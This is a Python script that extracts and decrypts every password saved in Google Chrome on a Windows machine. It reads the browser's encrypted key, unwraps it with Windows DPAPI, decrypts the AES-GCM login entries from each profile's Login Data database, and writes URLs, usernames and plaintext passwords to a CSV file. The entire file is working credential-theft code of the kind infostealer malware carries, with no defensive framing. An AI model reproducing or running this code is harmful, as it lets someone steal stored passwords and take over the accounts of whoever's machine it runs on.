import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))


def secret_key_grabber():
    with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    secret_key = secret_key[5:]
    secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
    return secret_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(ciphertext, secret_key):
    initialisation_vector = ciphertext[3:15]
    encrypted_password = ciphertext[15:-16]
    cipher = generate_cipher(secret_key, initialisation_vector)
    decrypted_pass = decrypt_payload(cipher, encrypted_password)
    decrypted_pass = decrypted_pass.decode()
    return decrypted_pass


def get_db_connection(chrome_path_login_db):
    shutil.copy2(chrome_path_login_db, "Loginvault.db")
    return sqlite3.connect("Loginvault.db")

def Main():
    with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(["index", "url", "username", "password"])
        secret_key = secret_key_grabber()
        folders = [element for element in os.listdir(CHROME_PATH) if
                   re.search("^Profile*|^Default$", element) != None]
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if (secret_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if (url != "" and username != "" and ciphertext != ""):
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        csv_writer.writerow([index, url, username, decrypted_password])
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")